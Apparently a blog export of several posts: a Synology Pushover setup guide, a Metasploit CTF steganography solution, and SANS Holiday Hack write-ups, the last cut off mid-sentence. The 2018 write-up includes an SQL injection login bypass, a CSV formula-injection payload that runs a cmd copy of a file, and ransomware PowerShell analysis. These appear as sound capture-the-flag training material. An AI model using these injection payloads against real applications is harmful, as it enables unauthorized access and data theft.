    "body": "Intro I recently added a Synology NAS to my home lab and I am an instant fan. I have been spending time configuring and tinkering with the new device.\nI use Pushover for sending push notifications from various home lab services to my devices. For example, I have it integrated in Home Assistant for reminders and notifications about unique automations.\nWhen configuring notifications on the NAS, I noticed a \u0026ldquo;Push Service\u0026rdquo; tab and thought, \u0026ldquo;Great! I\u0026rsquo;ll set up Pushover.\u0026rdquo; But, to my surprise, it did not support the option and simply mentioned sending via Synology\u0026rsquo;s email server. I did some quick searches but all the solutions revolved around configuring a local web server or script on the NAS to translate and build the request. I explored the other sections and found that you can add an SMS provider and build an HTTP request. This should be sufficient to use Pushover and/or Slack.\nIt is worth mentioning that this is a work-around, but the logic is solid. Another option is to set up the Pushover notifications from e-mails, but personally I have a bunch of Applications set up and prefer each to have its own bucket and associated icon.\nConfiguration This section is split into two parts, configuration of Pushover and configuration of the Synology.\nPushover If you have never used Pushover, it is a $4.99 once per-platform cost. I do think it is well worth the price based on how many applications I have set up over the years.\n After setting up and logging into your account click Create an Application/API Token, which is next to Your Applications at the bottom of the page. Choose a unique name for the app, upload an icon (recommended), agree to the terms of service and then click Create Application. If the application is created successfully, you will be provided with an API Token/Key. As a final step for Pushover, go back to the main page find Your User Key.  You will need the API Token/Key and Your User Key to configure the Synology notifications, so either copy them both into a text editor or simply take note of where they are.\nSynology  Navigate to Control Panel -\u0026gt; Notification -\u0026gt; SMS Check the box to Enable SMS Notifications, and select Add SMS service provider Enter \u0026ldquo;pushover\u0026rdquo; as the Provider Name, https://api.pushover.net/1/messages.json as the SMS URL, select POST as the HTTP Method, and click Next. Leave the Edit HTTP request header section blank and click Next. Add the following Parameter:Values to Edit HTTP Response Body (yes all the values are blank except message) and click Next     Parameter Value     user    token    phone    message hello world    Match the following categories to the parameters, then click Apply.  Make sure the \u0026ldquo;pushover\u0026rdquo; provider you created is selected as the SMS service provider, then fill in the values from Pushover in the SMS notification section. Your User Key will be the Username:, the API Token/Key from the application page will be the Password:, and then enter a Primary phone number: (this is not used, but is required - so any phone number works).  Click Apply, and then click Send a test SMS Message. If everything is set up correctly you should receive a push notification from Pushover on your registered device:  Conclusion I find it much easier to see a quick message pop up on my phone summarizing something happening in my home lab than checking e-mail constantly. Additionally, I have a UPS attached to my Synology via USB, so it is helpful to get Pushover notifications instead of missing the e-mail alerting me to a power anomaly and that my shutdown procedures are starting.\nI hope this guide was clear and helps others!\n",

    "body": "Intro My team and I participated in the Metasploit CTF this past week and came in third place! I wanted to write up a solution for one of my favorite challenges.\nSpecial thanks to the Metasploit team for creating another great CTF and congrats to team pepega and excusemewtf for taking the top spots!\nChallenge First, I browsed to port 80 and was met with this screen:\nInteresting, I kicked off a gobuster scan but returned to find no results. The icon in the top left looked suspicious, so I loaded it directly.\nWow, a QR code\u0026hellip;\nSPOILERS BELOW - The picture linked above is the exact image from the challenge, so feel free to give it a shot before reading the solution.\nSolution I cleaned up the QR code with gimp in order to scan it.\nNow, time to scan. I used zxing:\nWell, that\u0026rsquo;s no flag. However, this output reminded us of a similar message we encountered during the initial enumeration of the box.\nDuring the initial enumeration we ran a full nmap scan:\nWe saw port 1994 open, so we ran some quick tests against it:\nSee, this also mentions a cigar. I did attempt to submit the QR code and full ms_logo to the port with nc but no luck. I started analyzing the ms_logo image with a number of Stego tools, but wasn\u0026rsquo;t getting any usable results. However, that band of color in the top left corner kept bothering me. I took a closer look with gimp:\nThen, I wrote a small Python script to print out those unique pixels:\nfrom PIL import Image im = Image.open(\u0026#39;ms_logo.png\u0026#39;) rgb_im = im.convert(\u0026#39;RGB\u0026#39;) #print(\u0026#39;width: \u0026#39;, im.width) #print(\u0026#39;height:\u0026#39;, im.height) for i in range(im.height): r,g,b = im.getpixel((13,i)) if r != b and b != g: print(r,g,b) Here are the results:\npython3 color-column.py | head -n 3 244 243 246 248 246 255 246 255 247 Now, I don\u0026rsquo;t want anyone reading this post to think I instantly recognized this. I had a suspicion that Least Significant Bit (LSB) stego was a possibility, but I stared at these numbers for awhile and even jumped to other challenges. Finally, I came back and took a look with CyberChef:\nI see a pattern here. Let me illustrate it a little better:\nThe least significant bits, four to be exact, are changing. I wrote a Python script to pull these out:\n#!/usr/bin/env python3 from PIL import Image im = Image.open(\u0026#39;ms_logo.png\u0026#39;) for i in range(13,65): pix = im.getpixel((13,i)) for n in range(0,3): print(bin(pix[n])[-4:],end=\u0026#34;\u0026#34;) Here is the output after running the tool:\n$ python3 colors.py 010000110110100001101111011011110111001101100101001000000100110001101001011001100110010100101110001000000100001001110101011101000010000001110111011010000111100100100000011101110110111101110101011011000110010000100000010010010010000001110111011000010110111001110100001000000111010001101111001000000110010001101111001000000110000100100000011101000110100001101001011011100110011100100000011011000110100101101011011001010010000001110100011010000110000101110100001000000111011101101000011001010110111000100000010010010010000001101000011000010111011001100101001000000110100001100001011000110110101101101001011011100110011100111111 I collected the binary and ran it through CyberChef:\nThat looks like what we have been searching for! Moving back to the port I mentioned earlier, I tried submitting the string:\nAs you can see, it confirms we cracked the code and sends flag data. I redirected this information to a file:\n$ echo -n \u0026#34;Choose Life. But why would I want to do a thing like that when I have hacking?\u0026#34; | nc 172.16.1.101 1994 \u0026gt; qr.txt I opened it in vim and deleted the top two lines. The image did open and display fine, but I ran a quick run with pngcheck to verify the file:\n$ pngcheck qr.png qr.png additional data after IEND chunk ERROR: qr.png Luckily, I have seen this before:\nxxd qr.png | tail -n 5 0000a7e0: 3734 6dda 1484 481f 3db7 d4f9 8bd9 d851 74m...H.=......Q 0000a7f0: 5c5c 8cfd fbf7 e3f8 f1e3 2829 f12c fa05 \\\\........().,.. 0000a800: 1144 10be 0741 1048 4d4d 45fb f6ed 45d9 .D...A.HMME...E. 0000a810: ce88 c1ff 0102 5199 95f0 4bd1 1e00 0000 ......Q...K..... 0000a820: 0049 454e 44ae 4260 820a .IEND.B`.. This is a quick fix. I opened the png in a hex editor and deleted the trailing 0a.\nNow it should pass the check:\n$ pngcheck queen_of_diamonds.png OK: queen_of_diamonds.png (283x378, 32-bit RGB+alpha, non-interlaced, 89.9%). After making these modifications, we can view the final flag!\n$ queen_of_diamonds.png MD5 (queen_of_diamonds.png) = 01880728bf92ae2570ce3c0cd4b01d8b Thanks for reading!\n",

    "body": "Intro Hello and Happy New Year! This year\u0026rsquo;s Holiday Hack Challenge theme was an online conference called KringleCon, a cyber security conference hosted by Santa and his elves. It had all the elements of an in-person conference, including talks, badges, swag and the ability to network with other attendees. The challenge was to solve all 10 objectives and each of the \u0026ldquo;Cranberry Pi\u0026rdquo; mini-challenges.\nBefore reading my write-up, it is worth noting that previous Holiday Hack Challenges are kept all year now. So before you read this post, go try it out if you have not already.\nOne of the best parts of Holiday Hack is the collaboration and friends you make along the way. While in LineCON waiting for KringleCon to open, I hung with my buddies Cakez and Taffy:\nAfter entering Santa\u0026rsquo;s castle, I noticed a suspicious character with a walkie talkie in the middle of the first room. The name above his head read \u0026ldquo;Hans,\u0026rdquo; and I immediately recognized the Die Hard reference and knew we were in for some major fun!\nCranberry Pi Terminals Essential Editor Skills Vi can be exited a number of ways. I chose to use :q!. After exiting the editor, we were presented with the congratulatory message indicating we solved the first terminal.\nDevOps Fail As shown in the screenshot above, there are some credentials stored in this repo.

I wrote a simple one-liner that would summarize the event IDs from that IP:\nelf@0bd5ebc989bf:~$ grep -B 35 '\u0026lt;Data Name=\u0026quot;IpAddress\u0026quot;\u0026gt;172.31.254.101\u0026lt;/Data\u0026gt;' out.txt | grep '\u0026lt;EventID Qualifiers=\u0026quot;\u0026quot;\u0026gt; 4624\u0026lt;/EventID\u0026gt;' | wc -l 2 elf@0bd5ebc989bf:~$ grep -B 35 '\u0026lt;Data Name=\u0026quot;IpAddress\u0026quot;\u0026gt;172.31.254.101\u0026lt;/Data\u0026gt;' out.txt | grep '\u0026lt;EventID Qualifiers=\u0026quot;\u0026quot;\u0026gt;4625\u0026lt;/EventID\u0026gt;' | wc -l 211 For the unfamiliar, the event ID 4625 is a failed login and 4624 is a successful login. The data showed that the attacker failed 211 logins and successfully logged in twice. I checked what that the username data looked like:\nelf@be089c31f517:~$ grep -B 35 '\u0026lt;Data Name=\u0026quot;IpAddress\u0026quot;\u0026gt;172.31.254.101\u0026lt;/Data\u0026gt;' out.txt | egrep '\u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;' | sort | uniq -c | sort 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;aaron.smith\u0026lt;/Data\u0026gt; ————————————————— SNIPPED ————————————————————— 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;vijay.kumar\u0026lt;/Data\u0026gt; 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;vinod.kumar\u0026lt;/Data\u0026gt; 1 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;wunorse.openslae\u0026lt;/Data\u0026gt; 2 \u0026lt;Data Name=\u0026quot;TargetUserName\u0026quot;\u0026gt;minty.candycane\u0026lt;/Data\u0026gt; I knew that only a single account was compromised and password spraying was the vector. The output shows that minty.candycane is the account that was broken into due to it being an outlier with two successful logins, while every other account had one failed login.\nLethal ForensicELFication The first item of note for this challenge is a hidden directory named .secrets. It contained a directory called \u0026ldquo;her\u0026rdquo; that contained a poem.txt. However, the poem did not reveal who it was about. There is a .viminfo file in the home directory. This file is used to store state information so you can continue where you left off when you exited vim.\n$ cat .viminfo # This viminfo file was generated by Vim 8.0. # You may edit it if you're careful! # Command Line History (newest to oldest): :wq |2,0,1536607231,,\u0026quot;wq\u0026quot; :%s/Elinore/NEVERMORE/g |2,0,1536607217,,\u0026quot;%s/Elinore/NEVERMORE/g\u0026quot; The .viminfo file contained the command line history. This history reveals that Morcel Nougat performed a global search and replace in vim to replace all instances of Elinore with NEVERMORE. Submitting Elinore to runtoanswer results in:\nStall Mucking Report The screen resolution for this made it a bit difficult.

Going forward we'll leave behind policies old, Building separate accounts for each elf in the lot. -Wunorse Openslae Objectives Objective 1: Orientation Challenge What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle?\nThe image above shows me standing next to the kiosk. It poses six questions about past Holiday Hack challenges. The answers were:\n  In 2015, the Dosis siblings asked for help understanding what piece of their \u0026ldquo;Gnome in Your Home\u0026rdquo; toy?\nFirmware\n  In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?\nATNAS\n  In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?\nBusiness card\n  In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?\nCranberry Pi\n  In 2017, the North Pole was being bombarded by giant objects. What were they?\nSnowballs\n  In 2017, Sam the snowman needed help reassembling pages torn from what?\nThe Great Book\n  After answering all these, the secret phrase was revealed:\nObjective 2: Directory Browsing Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site (https://cfp.kringlecastle.com/) to find out.\nI browsed to the CFP site to take a look:\nWhen I clicked APPLY NOW! link, it brought me to this URL:\nI noted the cfp directory and removed cfp.html from the URL:\nNice, a directory listing! The listing contained a document called rejected-talks.csv. I clicked the link and searched the document for the title of the rejected talk:\nThe rejected talk was submitted by John McClane.\nObjective 3: de Bruijn Sequences When you break into the speaker unpreparedness room, what does Morcel Nougat say?\nThe door passcode panel indicated that the code was a four-shape combination. I will be totally honest here - I was preparing to write a script when I noticed that you can submit unlimited sequences without getting kicked from the terminal window. I simply \u0026ldquo;button-mashed\u0026rdquo; a few times and got lucky.\nAfter gaining access to the room and clicking on him, Morcel Nougat proclaims “Welcome unprepared speaker!”\nObjective 4: Data Repo Analysis Retrieve the encrypted ZIP file from the North Pole Git repository. What is the password to open this file?\nI cloned the repo and ran git log to look for anything interesting. I found a commit with an intriguing message:\ncommit 714ba109e573f37a6538beeeb7d11c9391e92a72 Author: Shinny Upatree \u0026lt;shinny.upatree@kringlecastle.com\u0026gt; Date: Tue Dec 11 07:23:36 2018 +0000 removing accidental commit Then, running a quick git diff between the accidental commit and the previous commit revealed this:\n$ git diff 714ba109 5f4f6414 diff --git a/schematics/files/dot/PW/for_elf_eyes_only.md b/schematics/files/dot/PW/for_elf_eyes_only.md new file mode 100644 index 0000000..b06a507 --- /dev/null +++ b/schematics/files/dot/PW/for_elf_eyes_only.md @@ -0,0 +1,15 @@ +Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference. + +Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did! + + +Hopefully this is the last time we have to change our password again until next Christmas. + + + + +Password = 'Yippee-ki-yay' + + +Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3' + I navigated to the schematics directory and unzipped ventilation_diagram.zip with the password Yippee-ki-yay. Submitting this password completed the objective and the ventilation diagrams provided the map to complete the Google Ventilation Maze.\nObjective 5: AD Privilege Discovery Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name?\nI was very excited for this challenge, I\u0026rsquo;m a big fan of BloodHound. I was hoping for a difficult challenge like writing a custom Cypher query, but getting others familiar with BloodHound is also important!\nAfter loading the BloodHound interface and navigating to the Queries section, there is a pre-built query that does exactly what we are looking for. A small tip here - since CanRDP is not a reliable path, I disabled it in the Edge Filtering menu (located under Special):\nRunning this pre-built query with the CanRDP filter unchecked resulted in only one path:\nTherefore, the only Kerberoastable user with a reliable path to DA is LDUBEJ00320@AD.KRINGLECASTLE.COM.\nObjective 6: Badge Manipulation Bypass the authentication mechanism associated with the room near Pepper Minstix. A sample employee badge is available. What is the access control number revealed by the door authentication panel?\nI performed some quick analysis of the sample badge:\n When scanned by the badge reader, it indicated the account is disabled The QR code on the badge contained oRfjg5uGHmbduj2m  Next, I created a new QR code with a single quote. Submitting that to the badge reader resulted in this error:\nEXCEPTION AT (LINE 96 \u0026quot;USER_INFO = QUERY(\u0026quot;SELECT FIRST_NAME,LAST_NAME,ENABLED FROM EMPLOYEES WHERE AUTHORIZED = 1 AND UID = '{}' LIMIT 1\u0026quot;.FORMAT(UID))\u0026quot;): (1064, U'YOU HAVE AN ERROR IN YOUR SQL SYNTAX; CHECK THE MANUAL THAT CORRESPONDS TO YOUR MARIADB SERVER VERSION FOR THE RIGHT SYNTAX TO USE NEAR '' LIMIT 1' AT LINE 1\u0026quot;) Great! A very verbose SQL error. I tried the generic auth bypass string:\n' OR \u0026lsquo;1\u0026rsquo; = \u0026lsquo;1\nHowever, this failed because it is returning a user account that is disabled. I modified my query string to ensure I get an enabled user:\n\u0026rsquo; OR enabled=\u0026lsquo;1\nSubmitting this granted us access to Santa\u0026rsquo;s secret room and output the control number 19880715.\nObjective 7: HR Incident Response Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with \u0026ldquo;K.\u0026quot;\nThe target website is a pretty standard careers page, with an option to upload a CSV containing your work history. The hints for this challenge indicate that the vector may be related to CSV Injection.\nI created a CSV file (in vim) with this content and uploaded it:\n=cmd|'/C copy C:\\candidate_evaluation.docx C:\\careerportal\\resources\\public\\foobar1.docx'!A1 This injected command copies the candidate evaluation document to a location I can access externally. After waiting a few seconds, I browsed to:\nhttps://careers.kringlecastle.com/public/foobar.docx\nI downloaded the document and opened it. It contained this snippet:\n\u0026quot;Krampus’s career summary included experience hardening decade old attack vectors, and lacked updated skills to meet the challenges of attacks against our beloved Holidays. Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist organization Fancy Beaver who openly provides technical support to the villains that attacked our Holidays last year.\u0026quot;  The answer to this objective is Fancy Beaver.\nObjective 8: Network Traffic Forensics Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?\nThis one really stumped me for awhile! When I first took a look at the Packalyzer app, I ran a capture, downloaded it, and investigated using Wireshark. Unfortunately, the traffic is encrypted, but that jogged my memory about something I had seen. After solving the Python Cranberry Pi, SugarPlum Mary shares a rumor that Packalyzer was rushed into production with development code sitting in the web root. I investigated and found a reference to app.js in a comment in the pages source. I loaded app.js:\nThe screenshot above shows:\n We need that keylog file to decrypt the HTTP/2 traffic The app is in dev mode Environment variables are being used  I knew that I needed to leak the environment variables, but how? Further down in the code:\nThis showed that the application builds the directory structure using the environment variables. Now, this is where I really tripped myself up\u0026hellip; I loaded /DEV/ saw this output:\nI thought to myself, \u0026ldquo;Well, that didn\u0026rsquo;t work\u0026hellip;\u0026rdquo; and went on testing and researching anything that could leak the environment variables. If I had run the second test, shown below, I would have realized that /DEV/ worked and I was just moving too quickly:\nAs shown in the two screenshots, I was able to obtain the environment variables values from the error messages. Then I loaded the final URL to grab the client random SSL log:\nI saved that to a file and loaded it into Wireshark (Preferences \u0026gt; Protocols \u0026gt; SSL):\nParsing the decrypted pcap, I expected to see a document sent but I was only able to collect three sets of credentials:\nalabaster:Packer-p@re-turntable192 bushy:Floppity_Floopy-flab19283 pepper:Shiz-Bamer_wabl182 Looking closer, these are the three users credentials for packalyzer. I logged in with all three to search around and Alabaster had a capture saved named \u0026ldquo;super_secret_packet_capture.pcap\u0026rdquo;. It is a capture containing only one stream, a single SMTP connection:\nThe email contained an attachment. I grabbed the base64 encoded text, decoded it and opened the file. It is a PDF describing how to transpose piano keys.\nI completed the objective by submitting the song - Mary Had a Little Lamb.\nObjective 9: Ransomware Recovery Alabaster Snowball is in dire need of your help. Santa\u0026rsquo;s file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa\u0026rsquo;s server by completing several tasks.\nCatch the Malware: Assist Alabaster by building a Snort filter to identify the malware plaguing Santa\u0026rsquo;s Castle.\nI loaded up the Snort terminal:\nThe more_info.txt file provides us with an web interface, https://snortsensor1.kringlecastle.com/, that stores the last five minutes worth of pcaps. I grabbed a few of the pcaps and started looking at the malicious traffic:\nInteresting. I saw a lot of DNS traffic to various domains, with a very unique hex string. I wanted to understand that string before keying on it:\n\u0026gt;\u0026gt;\u0026gt; '77616E6E61636F6F6B69652E6D696E2E707331'.decode('hex') 'wannacookie.min.ps1' Ok, good. Since that is a wannacookie-specific string, it is a great item to key on. I built the Snort rule below to match the malicious traffic. It is worth noting this is not a production-ready rule due to its use of PCRE without at least one content keyword. I tested the rule by adding it to /etc/snort/rules/local.rules:\nelf@f770b1e2e77d:~$ vim /etc/snort/rules/local.rules elf@f770b1e2e77d:~$ cat !$ cat /etc/snort/rules/local.rules # $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $ # ---------------- # LOCAL RULES # ---------------- # This file intentionally does not come with signatures.

Snort is alerting on all ransomware and only the ransomware! Objective completed!\nIdentify the Domain: Using the Word docm file, identify the domain name that the malware communicates with.\nWhere\u0026rsquo;s the fun in that? I decided to grab the malware off the wire. I grabbed a pcap from https://snortsensor1.kringlecastle.com/ and fired up tshark:\n$ tshark -Y dns -r snort.log.1545891713.0441875.pcap -Y 'dns.qry.name contains \u0026quot;77616E6E61636F6F6B69652E6D696E2E707331\u0026quot;' -T fields -e dns.txt \u0026gt; fused.txt $ sed '/^$/d' fused.txt | sed -n 'g;n;p' \u0026gt; fuse2.txt I put the content from fuse2.txt into CyberChef to decode the Hex:\nFinally, I opened the file in a text editor and replaced all the semi-colons with newlines to clean up the formatting. There were multiple references to erohetfanu.com throughout the malicious powershell script. I submitted erohetfanu.com to complete this objective.\nStop the Malware: Identify a way to stop the malware in its tracks!\nAlabaster mentions \u0026ldquo;another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.\u0026rdquo; I started analyzing the malware and found this line:\nif ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return} This looks promising, since 6B696C6C737769746368 hex decoded equates to \u0026ldquo;killswitch\u0026rdquo;. I used PowerShell ISE to complete this task. I loaded the PowerShell code, set a breakpoint at the killswitch line. Now, the call tries to resolve the name with 8.8.8.8. I removed the call to see what domain was being queried. With ISE, it is as simple as passing this into the debugger:\n$(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))) The screenshot below shows the output:\nI went over to the HoHoHoDaddy terminal and registered the yippeekiyaa.aaay domain:\nRegistering the domain completes this objective.\nRecover Alabaster\u0026rsquo;s Password: Recover Alabaster\u0026rsquo;s password as found in the the encrypted password vault.\nAfter completing the last objective, Alabaster provides a memory dump - his encrypted password database - and a request for help recovering his passwords. This objective was tough, but I had to cross the finish line. I had a general sense for what the PowerShell code was doing, but I went through and analyzed each part with PowerShell ISE to truly understand how it worked. I\u0026rsquo;ll keep this section brief, since this post is already fairly long.\nThe malware generates a random symmetric key and encrypts it using a public key that is retrieved with the g_o_dns function. In order to decrypt, I needed three items:\n The servers public key The servers private key The encrypted symmetric key  When decoding hex strings looking for the killswitch, I had discovered:\n\u0026gt;\u0026gt;\u0026gt; '7365727665722E637274'.decode('hex') 'server.crt' I started PowerShell ISE and set a breakpoint.

Next, I generated a PFX certificate using the servers public and private key using openssl:\nopenssl pkcs12 -export -out out.pfx -inkey server.key -in server.crt I imported the PFX cert in Windows using MMC.\nThat is everything I needed. Finally, I wrote a new function called decrypt, re-using a few of the functions from wannacookie. I included the code below, with just what I added to save some space:\nfunction decrypt{ $mycert = Get-Item \u0026#34;Cert:\\CurrentUser\\My\\B1D1E73DCBFFBD458B341A6E8AED3549A81077D6\u0026#34;; $foo = \u0026#34;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971\u0026#34;; $out = H2B($foo); [array]$f_c = $(Get-ChildItem -Path C:\\Users\\IEUser\\Desktop\\forensic_artifacts\\ -Recurse | Foreach-Object {$_.Fullname}) $bar = $mycert.PrivateKey.Decrypt($out, $true); e_n_d $bar $f_c $false; } I ran the decrypt function and the decrypted vault appeared in the directory. I issued the file command to see what type of file it was. It was a sqlite DB so I used sqlite3 to dump the passwords:\n$ file alabaster_passwords.elfdb alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002 $ sqlite3 alabaster_passwords.elfdb SQLite version 3.16.0 2016-11-04 19:09:39 Enter \u0026quot;.help\u0026quot; for usage hints. sqlite\u0026gt; .tables passwords sqlite\u0026gt; SELECT * from passwords; alabaster.snowball|CookiesR0cK!2!#|active directory alabaster@kringlecastle.com|KeepYourEnemiesClose1425|www.toysrus.com alabaster@kringlecastle.com|CookiesRLyfe!*26|netflix.com alabaster.snowball|MoarCookiesPreeze1928|Barcode Scanner alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault alabaster@kringlecastle.com|PetsEatCookiesTOo@813|neopets.com alabaster@kringlecastle.com|YayImACoder1926|www.codecademy.com alabaster@kringlecastle.com|Woootz4Cookies19273|www.4chan.org alabaster@kringlecastle.com|ChristMasRox19283|www.reddit.com The password for Alabaster\u0026rsquo;s vault is ED#ED#EED#EF#G#F#G#ABA#BA#B. After giving Alabaster his decrypted DB, he said, \u0026ldquo;I’m seriously impressed by your security skills. How could I forget that I used Rachmaninoff as my musical password?\u0026rdquo;\nObjective 10: Who Is behind it All? Who was the mastermind behind the whole KringleCon plan? And, in your emailed answers please explain that plan.\nThis is the final objective and to solve it, we have to unlock the piano lock. I confidently accessed the lock and entered the piano key password from Alabaster\u0026rsquo;s password vault. I was met with a message specifying, \u0026ldquo;Now that\u0026rsquo;s a good tune! But the key isn\u0026rsquo;t quite right\u0026hellip;\u0026rdquo;. A new hint from Alabaster Snowball appeared: \u0026ldquo;Really, it\u0026rsquo;s Mozart. And it should be in the key of D, not E.\u0026rdquo;\nInteresting. I dug up the PDF that Holly Evergreen had sent Alabaster during the Packalyzer challenge. The PDF had referenced transposition, which I used to convert the password.\nThe final password translated to - DC#DC#DDC#DEF#EF#GAG#AG#A. Using this, we play the piano lock and open the final door to reveal\u0026hellip;\nSanta was behind the whole KringleCon plan. Han and the Toy Soldiers (undercover Elves) work for him. The entire scenario was a test to find security professionals with skills across the various infosec domains to help defend the operation next year from any nefarious actors!\nConclusion Another great SANS Holiday Hack in the books! I loved the diversity of the challenges this year, which provided me with the opportunity to practice a number of different skills including pentesting, incident response, network forensics, malware analysis, and many more. As always, thank you to Ed Skoudis and the CounterHack team for putting it together.\nLooking forward to Holiday Hack 2019!\nMike\n",

    "date": "",
    "description": "",
    "body": "Intro The SANS Holiday Hack challenge this year was fantastic and I wanted to make sure to document my solutions on my blog. I have participated in the Holiday Hack Challenges since 2012, but haven\u0026rsquo;t documented them with the exception of some informal notes \u0026ndash; maybe I should change that! Anyway, enjoy my write-up and I encourage anyone who did not participate to give it a try before reading this post!\nOne other note: I finally finished writing this up. It\u0026rsquo;s about a month later than I expected, but life is busy.\nPart 0: Dosis Neighborhood The first step I took was to explore the Dosis neighborhood aka Holiday Hack Quest and complete all 21 achievements. As Johnny Drama would say, \u0026ldquo;VICTORY!\u0026rdquo;\nThis game was extremely fun and incredibly detailed, I was even able to drop by NetWars and say hello to Jeff McJunkin!\nThis was a pretty cool component to the challenge, offering mazes, riddles, and some hints for the analysis. As a huge Zelda fan, I admit that I was already very impressed even before beginning any actual hacking. My write-up is focused on the technical portions of the challenge and does not include a detailed walk-through of the game.\nPart 1: Curious Wireless Packets Josh Dosis informed us that \u0026ldquo;That gnome is not what he seemed!\u0026rdquo; and has captured some WiFi traffic from the network the gnome was on. He provided us with that capture and this is where the real fun starts.\nI completed this part of the challenge before the scapy helper scripts were provided, so I just used some command-line fu:\nmike@foo:~$ tcpdump -nnAr giyh-capture.pcap \u0026#39;src 52.2.229.189\u0026#39; | grep \u0026#39; TXT \u0026#39; | awk \u0026#39;{print $15}\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f2 \u0026gt; foo.txt reading from file giyh-capture.pcap, link-type IEEE802_11_RADIO (802.11 plus radiotap header) tcpdump: pcap_loop: truncated dump file; tried to read 117 captured bytes, only got 43 mike@foo:~$ for i in $(cat foo.txt); do echo $i | base64 --decode | grep -v \u0026#34;NONE:\u0026#34; \u0026gt;\u0026gt; bar.txt; done A few notes on this:\n  I only grabbed packets with the SuperGnome as the source. The packets with the Gnome as the source will just contain the output from the commands.  I removed the double-quotes and base64 decoded the lines.  Using grep -v, I removed the lines containing \"NONE:\" as those indicate no operation.  The output was:  EXEC:iwconfig EXEC:cat /tmp/iwlistscan.txt FILE:/root/Pictures/snapshot_CURRENT.jpg  This answers question #1 and alludes to the answer for #2:\n1) Which commands are sent across the Gnome’s command-and-control channel?\nThe two commands sent across the C2 channel were:\n  iwconfig  cat /tmp/iwlistscan.txt  Modifying my one-liners allowed me to grab the image sent across the channel. mike@foo:~$ tcpdump -nnAr giyh-capture.pcap \u0026#39;src 10.42.0.18\u0026#39; | grep \u0026#39; TXT \u0026#39; | awk \u0026#39;{print $20}\u0026#39; | cut -d\u0026#39;\u0026#34;\u0026#39; -f2 \u0026gt; foo.txt mike@foo:~$ for i in $(cat foo.txt); do echo $i | base64 --decode \u0026gt;\u0026gt; bar.txt; done mike@foo:~$ vim bar.txt mike@foo:~$ sed -i \u0026#34;s/FILE://g\u0026#34; bar.txt mike@foo:~$ mv bar.txt bar.jpg Notes:\n  I changed the source from the SuperGnome (52.2.229.189) to the Gnome (10.42.0.18) in order to grab the file sent.  I manually altered the original decoded data, in *vim*, and removed everything until the \"FILE:\" calls.  Using sed -i, I removed the \"FILE:\" calls from the file.  Finally, I changed the extension from txt to jpg and verified my result.  The result answers question \\#2: 2) What image appears in the photo the Gnome sent across the channel from the Dosis home?\nPart 2: Firmware Analysis for Fun and Profit I navigated over to Josh Dosis in the Dosis neighborhood and provided him with watermark from the image sent over the channel.\nHe directed me to Jess Dosis, who provided me with a firmware image and the following instructions:\n\u0026ldquo;I took the liberty of disassembling the Gnome and dumped the NAND storage using my Xeltek SuperPro 6100 to a file. Can you extract a password from this data dump?\u0026rdquo;\nNow I play with packet captures all day, but firmware analysis?! I decided to do some additional research and see if I could learn some new skills.\n{% codeblock lang:bash %} mike@foo:~/sans-holiday-hack-2015$ ls giyh-firmware-dump.bin {% endcodeblock %}\nUsing binwalk, I extracted the files filed found in the firmware using the -e option.\n mike@foo:~/sans-holiday-hack-2015$ binwalk -e giyh-firmware-dump.bin DECIMAL HEX DESCRIPTION ------------------------------------------------------------------------------------------------------- 0 0x0 PEM certificate 1809 0x711 ELF 32-bit LSB shared object, ARM, version 1 (SYSV) 168803 0x29363 Squashfs filesystem, little endian, version 4.0, compression: gzip, size: 17376149 bytes, 4866 inodes, blocksize: 131072 bytes, created: Tue Dec 8 13:47:32 2015 mike@foo:~/sans-holiday-hack-2015$ ls 29363.squashfs giyh-firmware-dump.bin  Interesting \u0026ndash; a squashfs fileystsem, used mainly in tiny-sized and embedded Linux systems, which sounds like the 